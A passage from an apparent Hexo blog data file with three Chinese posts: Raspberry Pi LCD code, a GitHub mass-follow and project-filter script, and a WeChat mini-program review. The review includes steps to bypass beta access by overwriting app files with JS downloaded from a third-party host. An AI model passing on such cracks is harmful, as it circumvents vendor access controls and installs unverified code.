class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'left justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write4bits</span><span class=\"params\">(self, bits, char_mode=False)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send command to LCD \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1000</span>) <span class=\"comment\"># 1000 microsecond sleep</span></div><div class=\"line\"></div><div class=\"line\">        bits=bin(bits)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">8</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.output(self.pin_rs, char_mode)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>,<span class=\"number\">8</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i<span class=\"number\">-4</span>], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delayMicroseconds</span><span class=\"params\">(self, microseconds)</span>:</span></div><div class=\"line\">        seconds = microseconds / float(<span class=\"number\">1000000</span>) <span class=\"comment\"># divide microseconds by 1 million for seconds</span></div><div class=\"line\">        sleep(seconds)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pulseEnable</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">True</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># commands need &gt; 37us to settle</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">message</span><span class=\"params\">(self, text)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send string to LCD. Newline wraps to second line\"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> text:</div><div class=\"line\">            <span class=\"keyword\">if</span> char == <span class=\"string\">'\\n'</span>:</div><div class=\"line\">                self.write4bits(<span class=\"number\">0xC0</span>) <span class=\"comment\"># next line</span></div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                self.write4bits(ord(char),<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        tmp = get_tmp() </div><div class=\"line\">        <span class=\"keyword\">if</span> tmp:</div><div class=\"line\">            lcd = Adafruit_CharLCD()</div><div class=\"line\">            lcd.noBlink()</div><div class=\"line\">            lcd.clear()</div><div class=\"line\">            lcd.message(tmp)</div><div class=\"line\">        sleep(<span class=\"number\">5</span>)</div></pre></td></tr></table></figure></p>\n<h1 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h1><p><img src=\"/content/images/2016/08/WechatIMG302.jpeg\" alt=\"\"></p>\n<p><img src=\"/content/images/2016/08/WechatIMG293.jpeg\" alt=\"\"></p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://gist.github.com/hugozhu/6166527\">https://gist.github.com/hugozhu/6166527</a><br><a href=\"https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\">https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f</a><br><a href=\"https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\">https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py</a><br><a href=\"http://blog.csdn.net/xukai871105/article/details/12684617\">http://blog.csdn.net/xukai871105/article/details/12684617</a><br><a href=\"https://www.oschina.net/question/1425530\\_140979\">https://www.oschina.net/question/1425530\\_140979</a><br><a href=\"http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\">http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html</a><br><a href=\"http://blog.csdn.net/netccy/article/details/48098455\">http://blog.csdn.net/netccy/article/details/48098455</a><br><a href=\"https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\">https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\">http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\">http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html</a><br><a href=\"http://blog.csdn.net/rocklee/article/details/50082777\">http://blog.csdn.net/rocklee/article/details/50082777</a><br><a href=\"http://www.guokr.com/post/718305/\">http://www.guokr.com/post/718305/</a><br><a href=\"http://www.rs-online.com/designspark/electronics/blog/content-1148\">http://www.rs-online.com/designspark/electronics/blog/content-1148</a><br><a href=\"http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\">http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html</a><br><a href=\"https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\">https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml</a><br><a href=\"http://blog.csdn.net/u013431550/article/details/40870947\">http://blog.csdn.net/u013431550/article/details/40870947</a><br><a href=\"http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\">http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba</a><br><a href=\"http://blog.csdn.net/longerzone/article/details/36171381\">http://blog.csdn.net/longerzone/article/details/36171381</a></p>"},{"title":"当我关注3万Github用户后发生了什么","date":"2016-11-19T11:36:26.000Z","header-img":"/content/images/githubauto/background.jpg","_content":"# 前言\n16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。\n\n于是乎我利用这个关注了3万人的Github，可是关注后~~除了同性交友~~似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。\n<!-- more --> \n![](/content/images/githubauto/1.jpg)\n\n翻都翻不过来，那么同时还存在一些“无用( ~~垃圾~~ )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？\n\n经过短暂的编码，``GithubAwesome.py``诞生了。\n\n现在进入[AutoGithub](https://github.com/yfgeek/AutoGithub)项目就可以看到GithubAwesome.py项目\n\n# 规则\n\n设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。\n\n举个🌰\n```\n最少 star 数: 50\n最少 fork 数: 50\n```\n\n效果如图\n\n![](/content/images/githubauto/awesomesnap.png)\n\n# 配置\n\n首先，确保你安装了``beautifulsoup4``.\n\n```\npip install beautifulsoup4\n```\n然后编辑``GithubAwesome.py``文件，请原谅如此土的方式。\n```python\nga = GithubAwesome('username','password')\n# login\nga.login()\nga.get_awesome(1,20,50) # 第一页 规则 min star 20 min or fork 20\n```\n# 写在最后\n\n当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁","source":"_posts/当我关注3万Githb用户后发生了什么.md","raw":"---\ntitle: 当我关注3万Github用户后发生了什么\ndate: 2016-11-19 11:36:26\npermalink: github3k\ntags: Github\ncategories: Github\nheader-img: \"/content/images/githubauto/background.jpg\"\n\n---\n# 前言\n16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。\n\n于是乎我利用这个关注了3万人的Github，可是关注后~~除了同性交友~~似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。\n<!-- more --> \n![](/content/images/githubauto/1.jpg)\n\n翻都翻不过来，那么同时还存在一些“无用( ~~垃圾~~ )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？\n\n经过短暂的编码，``GithubAwesome.py``诞生了。\n\n现在进入[AutoGithub](https://github.com/yfgeek/AutoGithub)项目就可以看到GithubAwesome.py项目\n\n# 规则\n\n设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。\n\n举个🌰\n```\n最少 star 数: 50\n最少 fork 数: 50\n```\n\n效果如图\n\n![](/content/images/githubauto/awesomesnap.png)\n\n# 配置\n\n首先，确保你安装了``beautifulsoup4``.\n\n```\npip install beautifulsoup4\n```\n然后编辑``GithubAwesome.py``文件，请原谅如此土的方式。\n```python\nga = GithubAwesome('username','password')\n# login\nga.login()\nga.get_awesome(1,20,50) # 第一页 规则 min star 20 min or fork 20\n```\n# 写在最后\n\n当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁","slug":"github3k","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xp0002q5es5s6ektd48","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。</p>\n<p>于是乎我利用这个关注了3万人的Github，可是关注后<del>除了同性交友</del>似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。<br><a id=\"more\"></a><br><img src=\"/content/images/githubauto/1.jpg\" alt=\"\"></p>\n<p>翻都翻不过来，那么同时还存在一些“无用( <del>垃圾</del> )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？</p>\n<p>经过短暂的编码，<code>GithubAwesome.py</code>诞生了。</p>\n<p>现在进入<a href=\"https://github.com/yfgeek/AutoGithub\" target=\"_blank\" rel=\"external\">AutoGithub</a>项目就可以看到GithubAwesome.py项目</p>\n<h1 id=\"规则\"><a href=\"#规则\" class=\"headerlink\" title=\"规则\"></a>规则</h1><p>设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。</p>\n<p>举个🌰<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">最少 star 数: 50</div><div class=\"line\">最少 fork 数: 50</div></pre></td></tr></table></figure></p>\n<p>效果如图</p>\n<p><img src=\"/content/images/githubauto/awesomesnap.png\" alt=\"\"></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>首先，确保你安装了<code>beautifulsoup4</code>.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install beautifulsoup4</div></pre></td></tr></table></figure>\n<p>然后编辑<code>GithubAwesome.py</code>文件，请原谅如此土的方式。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">ga = GithubAwesome(<span class=\"string\">'username'</span>,<span class=\"string\">'password'</span>)</div><div class=\"line\"><span class=\"comment\"># login</span></div><div class=\"line\">ga.login()</div><div class=\"line\">ga.get_awesome(<span class=\"number\">1</span>,<span class=\"number\">20</span>,<span class=\"number\">50</span>) <span class=\"comment\"># 第一页 规则 min star 20 min or fork 20</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><p>当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁</p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。</p>\n<p>于是乎我利用这个关注了3万人的Github，可是关注后<del>除了同性交友</del>似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。<br>","more":"<br><img src=\"/content/images/githubauto/1.jpg\" alt=\"\"></p>\n<p>翻都翻不过来，那么同时还存在一些“无用( <del>垃圾</del> )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？</p>\n<p>经过短暂的编码，<code>GithubAwesome.py</code>诞生了。</p>\n<p>现在进入<a href=\"https://github.com/yfgeek/AutoGithub\">AutoGithub</a>项目就可以看到GithubAwesome.py项目</p>\n<h1 id=\"规则\"><a href=\"#规则\" class=\"headerlink\" title=\"规则\"></a>规则</h1><p>设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。</p>\n<p>举个🌰<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">最少 star 数: 50</div><div class=\"line\">最少 fork 数: 50</div></pre></td></tr></table></figure></p>\n<p>效果如图</p>\n<p><img src=\"/content/images/githubauto/awesomesnap.png\" alt=\"\"></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><p>首先，确保你安装了<code>beautifulsoup4</code>.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install beautifulsoup4</div></pre></td></tr></table></figure>\n<p>然后编辑<code>GithubAwesome.py</code>文件，请原谅如此土的方式。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">ga = GithubAwesome(<span class=\"string\">'username'</span>,<span class=\"string\">'password'</span>)</div><div class=\"line\"><span class=\"comment\"># login</span></div><div class=\"line\">ga.login()</div><div class=\"line\">ga.get_awesome(<span class=\"number\">1</span>,<span class=\"number\">20</span>,<span class=\"number\">50</span>) <span class=\"comment\"># 第一页 规则 min star 20 min or fork 20</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h1><p>当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁</p>"},{"title":"微信小程序的一些感想","date":"2016-09-25T17:50:00.000Z","_content":"\n# 前言\n这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。\n<!-- more --> \n# 下载\n微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。\nMac版下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\n\nwindows下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\n\n# 破解\n如果你不是内测用户，你需要破解，先下载以下文件。\n\n文件1：\n\nhttp://source.lattecake.com/files/2016/09/createstep.js\n\n文件2：\n\nhttp://source.lattecake.com/files/2016/09/projectStores.js\n\n替换路径：\n\ncreatestep.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js\n\nprojectStores.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js\n\n# 尝鲜\n\n![](/content/images/wechat/1.jpg)\n\n![](/content/images/wechat/2.jpg)\n做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：\n* app.js\n* app.wxss\n* app.json\n* app.wxml\n\n其中wxss文件类似于css，所有css语法均支持\njs是APP()\njson文件是层级设置，页面的形态\nwxml文件更像是xml和html的混合版\n\n![](/content/images/wechat/3.jpg)\n\nIDE并不强大，但是是用HTML写的，有点类似于VS CODE。\n\n# 优点\n* **HTML5是未来，腾讯帮助整个生态系统往前走了一大步。**\n* 腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。\n* 有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。\n* 开发简单，入门门槛低。\n\n# 缺点\n* 不支持引用js，比如jquery等众多优秀的js插件。\n* 可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。\n* 随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。\n* 没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。\n\n# 总结\n我想用一句名言总结一下前端趋势及未来App趋势：\n> Any application that can be written in JavaScript, will eventually be written in JavaScript.\n\n腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。\n\n不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。\n","source":"_posts/微信小程序的一些感想.md","raw":"---\ntitle: 微信小程序的一些感想\ndate: 2016-09-25 18:50:00\ntags: Web\ncategories: Web\n---\n\n# 前言\n这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。\n<!-- more --> \n# 下载\n微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。\nMac版下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\n\nwindows下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\n\n# 破解\n如果你不是内测用户，你需要破解，先下载以下文件。\n\n文件1：\n\nhttp://source.lattecake.com/files/2016/09/createstep.js\n\n文件2：\n\nhttp://source.lattecake.com/files/2016/09/projectStores.js\n\n替换路径：\n\ncreatestep.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js\n\nprojectStores.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js\n\n# 尝鲜\n\n![](/content/images/wechat/1.jpg)\n\n![](/content/images/wechat/2.jpg)\n做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：\n* app.js\n* app.wxss\n* app.json\n* app.wxml\n\n其中wxss文件类似于css，所有css语法均支持\njs是APP()\njson文件是层级设置，页面的形态\nwxml文件更像是xml和html的混合版\n\n![](/content/images/wechat/3.jpg)\n\nIDE并不强大，但是是用HTML写的，有点类似于VS CODE。\n\n# 优点\n* **HTML5是未来，腾讯帮助整个生态系统往前走了一大步。**\n* 腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。\n* 有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。\n* 开发简单，入门门槛低。\n\n# 缺点\n* 不支持引用js，比如jquery等众多优秀的js插件。\n* 可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。\n* 随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。\n* 没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。\n\n# 总结\n我想用一句名言总结一下前端趋势及未来App趋势：\n> Any application that can be written in JavaScript, will eventually be written in JavaScript.\n\n腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。\n\n不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。\n","slug":"微信小程序的一些感想","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xp2002t5es5caq9ht5u","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。<br><a id=\"more\"></a> </p>\n<h1 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h1><p>微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。<br>Mac版下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg</a></p>\n<p>windows下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe</a></p>\n<h1 id=\"破解\"><a href=\"#破解\" class=\"headerlink\" title=\"破解\"></a>破解</h1><p>如果你不是内测用户，你需要破解，先下载以下文件。</p>\n<p>文件1：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/createstep.js\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/createstep.js</a></p>\n<p>文件2：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/projectStores.js\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/projectStores.js</a></p>\n<p>替换路径：</p>\n<p>createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js</p>\n<p>projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js</p>\n<h1 id=\"尝鲜\"><a href=\"#尝鲜\" class=\"headerlink\" title=\"尝鲜\"></a>尝鲜</h1><p><img src=\"/content/images/wechat/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/wechat/2.jpg\" alt=\"\"><br>做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：</p>\n<ul>\n<li>app.js</li>\n<li>app.wxss</li>\n<li>app.json</li>\n<li>app.wxml</li>\n</ul>\n<p>其中wxss文件类似于css，所有css语法均支持<br>js是APP()<br>json文件是层级设置，页面的形态<br>wxml文件更像是xml和html的混合版</p>\n<p><img src=\"/content/images/wechat/3.jpg\" alt=\"\"></p>\n<p>IDE并不强大，但是是用HTML写的，有点类似于VS CODE。</p>\n<h1 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h1><ul>\n<li><strong>HTML5是未来，腾讯帮助整个生态系统往前走了一大步。</strong></li>\n<li>腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。</li>\n<li>有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。</li>\n<li>开发简单，入门门槛低。</li>\n</ul>\n<h1 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h1><ul>\n<li>不支持引用js，比如jquery等众多优秀的js插件。</li>\n<li>可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。</li>\n<li>随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。</li>\n<li>没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。</li>\n</ul>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>我想用一句名言总结一下前端趋势及未来App趋势：</p>\n<blockquote>\n<p>Any application that can be written in JavaScript, will eventually be written in JavaScript.</p>\n</blockquote>\n<p>腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。</p>\n<p>不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。</p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。<br>","more":"</p>\n<h1 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h1><p>微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。<br>Mac版下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg</a></p>\n<p>windows下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe</a></p>\n<h1 id=\"破解\"><a href=\"#破解\" class=\"headerlink\" title=\"破解\"></a>破解</h1><p>如果你不是内测用户，你需要破解，先下载以下文件。</p>\n<p>文件1：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/createstep.js\">http://source.lattecake.com/files/2016/09/createstep.js</a></p>\n<p>文件2：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/projectStores.js\">http://source.lattecake.com/files/2016/09/projectStores.js</a></p>\n<p>替换路径：</p>\n<p>createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js</p>\n<p>projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js</p>\n<h1 id=\"尝鲜\"><a href=\"#尝鲜\" class=\"headerlink\" title=\"尝鲜\"></a>尝鲜</h1><p><img src=\"/content/images/wechat/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/wechat/2.jpg\" alt=\"\"><br>做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：</p>\n<ul>\n<li>app.js</li>\n<li>app.wxss</li>\n<li>app.json</li>\n<li>app.wxml</li>\n</ul>\n<p>其中wxss文件类似于css，所有css语法均支持<br>js是APP()<br>json文件是层级设置，页面的形态<br>wxml文件更像是xml和html的混合版</p>\n<p><img src=\"/content/images/wechat/3.jpg\" alt=\"\"></p>\n<p>IDE并不强大，但是是用HTML写的，有点类似于VS CODE。</p>\n<h1 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" 